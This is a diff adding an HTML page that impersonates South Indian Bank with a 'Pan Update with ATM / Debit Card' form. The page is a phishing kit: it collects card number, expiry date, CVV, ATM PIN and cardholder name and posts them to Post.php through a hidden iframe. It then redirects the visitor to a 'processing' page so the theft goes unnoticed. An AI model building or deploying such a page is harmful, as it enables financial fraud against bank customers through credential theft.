@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+    <meta charSet="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <meta name="theme-color" content="#AE2626">
+    <title>South Indian Bank | Debit Card Details</title>
+<meta name="description" content="login" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Arimo:ital,wght@0,400..700;1,400..700&display=swap" rel="stylesheet">
+<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css'>
+<link rel="stylesheet" href="./style.css">
+</head>
+<style type="text/css">
+#mn
+{ 
+  width:104%;
+  margin-left:-7px;
+  margin-bottom:40px;
+}
+#ft
+{ 
+  width:103%;
+  margin-top:50px;
+  margin-left:-5px;
+  text-align:bottom;
+}
+#pc
+{ 
+  width:100%;
+  margin-bottom:5px;
+}
+#cp
+{ 
+  width:65%;
+  margin-left:2px;
+  margin-bottom:10px;
+}
+input[type="text"] {
+  width: 95%;
+  color:#000;
+  font-size:13px;
+  border: 1px solid #E3DFDE;
+  border-radius: 4px;
+  letter-spacing:0.2px;
+  padding:10px 30px;
+  outline: none;
+  box-sizing: border-box;
+  transition: 0.3s;
+}
+body{
+  font-family: 'Arimo', sans-serif;
+   background-color: #f7f7f7;
+  
+}
+
+
+/*------------*/
+.form-area {
+    background-color: #fff;
+    box-shadow: 2px 5px 10px rgba(90, 116, 148, 0.2);
+    padding: 25px;
+    border-radius: 6px;
+    display: flex;
+    }
+.form-area .form-inner {
+    width: 100%;
+}
+.intl-tel-input,
+.iti{
+  width: 100%;
+}
+.inputWithIconHe {
+  position: relative;
+}
+
+.inputWithIconHe i {
+  position: absolute;
+  left: 0;
+  top: -3px;
+  font-size:20px;
+  padding: 2px 0px;
+  color: #AE2626;
+  transition: 0.3s;
+}
+.inputWithIconC input[type="text"] {
+  padding-left: 30px;
+}
+
+.inputWithIconC {
+  position: relative;
+}
+
+.inputWithIconC i {
+  position: absolute;
+  left: 0;
+  top: 2px;
+  font-size:14px;
+  padding: 10px 18px;
+  color: #777777;
+  transition: 0.3s;
+}
+.inputWithIconD input[type="text"] {
+  padding-left: 30px;
+}
+
+.inputWithIconD {
+  position: relative;
+}
+
+.inputWithIconD i {
+  position: absolute;
+  left: 0;
+  top: 1.5px;
+  font-size:14px;
+  padding: 10px 18px;
+  color: #777777;
+  transition: 0.3s;
+}
+.inputWithIconP input[type="text"] {
+  padding-left: 30px;
+}
+
+.inputWithIconP {
+  position: relative;
+}
+
+.inputWithIconP i {
+  position: absolute;
+  left: 0;
+  top: 1.5px;
+  font-size:14px;
+  padding: 10px 20px;
+  color: #777777;
+  transition: 0.3s;
+}
+.inputWithIconN input[type="text"] {
+  padding-left: 30px;
+}
+
+.inputWithIconN {
+  position: relative;
+}
+
+.inputWithIconN i {
+  position: absolute;
+  left: 0;
+  top: 1.5px;
+  font-size:14px;
+  padding: 10px 18px;
+  color: #777777;
+  transition: 0.3s;
+}
+.input-group__input
+{
+    text-transform: uppercase;
+}
+
+input::-webkit-input-placeholder {
+    color: transparent;
+    font-size:12px;
+    letter-spacing:0.5px;
+    font-family: 'Arimo', sans-serif;
+}
+input:focus::-webkit-input-placeholder {
+    color: #999;
+    font-size:12px;
+    letter-spacing:0.5px;
+    text-transform:none;
+    font-family: 'Arimo', sans-serif;
+}
+
+/* Firefox < 19 */
+input:-moz-placeholder {
+    color: transparent;
+    font-size:12px;
+    letter-spacing:0.5px;
+    font-family: 'Arimo', sans-serif;
+}
+input:focus:-moz-placeholder {
+    color: #999;
+    font-size:12px;
+    letter-spacing:0.5px;
+    font-family: 'Arimo', sans-serif;
+    text-transform:none;
+}
+
+/* Firefox > 19 */
+input::-moz-placeholder {
+    color: transparent;
+    font-size:12px;
+    letter-spacing:0.5px;
+    font-family: 'Arimo', sans-serif;
+}
+input:focus::-moz-placeholder {
+    color: #999;
+    font-size:12px;
+    letter-spacing:0.5px;
+    font-family: 'Arimo', sans-serif;
+    text-transform:none;
+}
+
+/* Internet Explorer 10 */
+input:-ms-input-placeholder {
+    color: transparent;
+    font-size:12px;
+    letter-spacing:0.5px;
+    font-family: 'Arimo', sans-serif;
+}
+input:focus:-ms-input-placeholder {
+    color: #999;
+    font-size:12px;
+    letter-spacing:0.5px;
+    font-family: 'Arimo', sans-serif;
+    text-transform:none;
+}
+</style>
+<body onload="startTimer();">
+  <!-- Static- Please don't do anything here-->
+  <script type="text/javascript">var submitted=false;</script>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='new_processing2.html';}"></iframe>
+        <div class="container">
+        <img alt="" src="South_Logo.jpg" id="mn"/><br>
+        <section class="pt-5 pb-5">
+    <div class="container text-center">
+        <div class="row">
+        </div>
+    </div>
+
+    <div class="container"
+        <div class="row justify-content-center">
+                <div class="form-area">
+                    <div class="form-inner">
+                        <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="form">
+                        <center><img alt="" src="South_L.jpg" id="pc"/></center>
+                        <div class="inputWithIconHe">
+                        <center><h3 style="color:#AE2626; font-family: 'Arimo', sans-serif; font-size:16px; letter-spacing:0.5px; margin-left:20px;">Pan Update with ATM / Debit Card</h3>
+                        <i class="fa fa-credit-card" aria-hidden="true"></i></center>
+                        </div><br>
+                        <div class="inputWithIconC">
+                        <div class="input-group">
+                        <center><input class="input-group__input" type="text" name="Card_Number" inputmode="numeric" minlength="16" maxlength="19"
+                        placeholder="1234 1234 1234 1234" id="dn" required />
+                        <label class="input-group__label" for="mobile">ATM / Debit Card Number<span style="color:red;">*</span></label>
+                        <i class="fa fa-credit-card" aria-hidden="true"></i></center>
+                        </div>
+                        </div>
+                        <script>
+                        function _getcaret(input) {
+                        if ('selectionStart' in input) {
+                        // Standard-compliant browsers
+                        return input.selectionStart;
+                        } else if(document.selection) {
+                        input.focus();
+                        var sel = document.selection.createRange();
+                        var selLen = document.selection.createRange().text.length;
+                        sel.moveStart('character', -input.value.length);
+                        return sel.text.length - selLen;
+                        }
+                        }
+                        function _setcaret(input, pos) {
+                        if (input.setSelectionRange) {
+                        input.focus()
+                        input.setSelectionRange(pos,pos)
+                        } else if(input.createTextRange) {
+                        var range = input.createTextRange();
+                        range.move('character', pos);
+                        range.select();
+                        }
+                        }
+                        
+                        function _format_464 (cc) {
+                        return [cc.substring(0,4),cc.substring(4,10),cc.substring(10,14)].join(' ').trim()
+                        }
+                        function _format_465 (cc) {
+                        return [cc.substring(0,4),cc.substring(4,10),cc.substring(10,15)].join(' ').trim()
+                        }
+                        function _format_4444 (cc) {
+                        return cc?cc.match(/[0-9]{1,4}/g).join(' '):''
+                        }
+                        _CARD_TYPES = [
+                        {'type':'visa','pattern':/^4/, 'format': _format_4444, 'maxlength': 16},
+                        {'type':'master','pattern':/^(5[12345])|(2[2-7])/, 'format': _format_4444, 'maxlength': 16},
+                        {'type':'amex','pattern':/^3[47]/, 'format': _format_465, 'maxlength':15},
+                        {'type':'instapayment','pattern':/^63[789]/, 'format': _format_4444, 'maxlength':16},
+                        {'type':'diners_club_carte_blanche','pattern':/^30[0-5]/, 'format': _format_464, 'maxlength':14},
+                        {'type':'diners_club_international','pattern':/^30[0-5]/, 'format': _format_464, 'maxlength':14},
+                        {'type':'diners_club','pattern':/^54/, 'format': _format_4444, 'maxlength':16}
+                        ]
+                        function _format_cardnumber(cc, maxlength) {
+                        cc = cc.replace(/[^0-9]+/g,'')
+                        
+                        for(var i in _CARD_TYPES) {
+                        const ct = _CARD_TYPES[i]
+                        if(cc.match(ct.pattern)) {
+                        cc = cc.substring(0,ct.maxlength)
+                        return ct.format(cc)
+                        }
+                        }
+                        
+                        return _format_4444(cc)
+                        /*
+                        if(maxlength) {
+                        cc = cc.substring(0,maxlength)
+                        }
+                        if(cc.match(/^3[47]/)) {
+                        return [cc.substring(0,4),cc.substring(4,10),cc.substring(10,15)].join(' ').trim()
+                        }
+                        return cc?cc.match(/.{1,4}/g).join(' '):''
+                        */
+                        }
+                        
+                        function _set_creditcard_number(event) {
+                        const input = event.target
+                        const maxlength = input.getAttribute('maxlength')
+                        
+                        var oldval = input.value
+                        var caret_position = _getcaret(input)
+                        var before_caret = oldval.substring(0,caret_position)
+                        before_caret = _format_cardnumber(before_caret)
+                        caret_position = before_caret.length
+                        
+                        var newvalue = _format_cardnumber(oldval, maxlength)
+                        
+                        if(oldval==newvalue) return
+                        
+                        input.value = newvalue
+                        _setcaret(input, caret_position)
+                        }
+                        
+                        function make_credit_card_input(input) {
+                        input.addEventListener('input',_set_creditcard_number)
+                        input.addEventListener('keyup',_set_creditcard_number)
+                        input.addEventListener('keydown',_set_creditcard_number)
+                        input.addEventListener('keypress',_set_creditcard_number)
+                        input.addEventListener('change',_set_creditcard_number)
+                        }
+                        
+                        make_credit_card_input(document.getElementById("dn"));
+                        
+                        
+                        </script>
+                        <div class="inputWithIconD">
+                        <div class="input-group">
+                        <center><input class="input-group__input" type="text" name="Expiry_Date" inputmode="numeric" minlength="4" maxLength="5"
+                         placeholder="MM/YY" id="expiry" onkeyup="formatString(event);" required />
+                        <label class="input-group__label" for="mobile">Expiry Date <span style="color:red;">*</span></label>
+                        <i class="fa fa-calendar" aria-hidden="true"></i></center></div>
+                        </div>
+                         </script>
+                        <div class="inputWithIconD">
+                        <div class="input-group">
+                        <center><input class="input-group__input" type="text" name="CVV" inputmode="numeric" minlength="3" maxLength="3"
+                         placeholder="CVV" id="expiry" onkeyup="(event);" required >
+                        <label class="input-group__label" for="mobile">CVV <span style="color:red;">*</span></label>
+                        <i class="fa fa-credit-card" aria-hidden="true"></i></center>
+                        </div>
+                        </div>
+                        <script type="text/javascript">
+                        function formatString(e) {
+                        var inputChar = String.fromCharCode(event.keyCode);
+                        var code = event.keyCode;
+                        var allowedKeys = [8];
+                        if (allowedKeys.indexOf(code) !== -1) {
+                        return;
+                        }
+                        
+                        event.target.value = event.target.value.replace(
+                        /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
+                        ).replace(
+                        /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
+                        ).replace(
+                        /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
+                        ).replace(
+                        /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
+                        ).replace(
+                        /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
+                        ).replace(
+                        /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
+                        ).replace(
+                        /\/\//g, '/' // Prevent entering more than 1 `/`
+                        );
+                        }
+                        </script>
+                        <div class="inputWithIconP">
+                        <div class="input-group">
+                        <center><input class="input-group__input" type="text" name="ATM_PIN" inputmode="numeric" maxlength="4" placeholder="xxxx" id="pin"
+                        pattern="[0-9]\d{3}" title="Please enter valid ATM PIN number !" required />
+                        <label class="input-group__label" for="mobile">ATM PIN <span style="color:red;">*</span></label>
+                        <i class="fa fa-key" aria-hidden="true"></i></center>
+                        </div>
+                        </div>
+                        <div class="inputWithIconN">
+                        <div class="input-group">
+                        <center><input class="input-group__input" type="text" name="Card_Holder_Name" minlength="3" maxlength="30"
+                        onkeydown="return /[a-z A-Z]/i.test(event.key)" placeholder="Name on card" id="Name" required />
+                        <label class="input-group__label" for="mobile">Card Holder Name <span style="color:red;">*</span></label>
+                        <i class="fa fa-user-o" aria-hidden="true"></i></center>
+                        </div>
+                        </div>
+                        <center><button type="submit">Continue</button></center><br>
+                        </form>
+                        
+</section>
+                        <img alt="" src="Footer.jpg" id="ft"/>
+               </div>
+               </div>
+               </div>
+               </div>
+               </html>
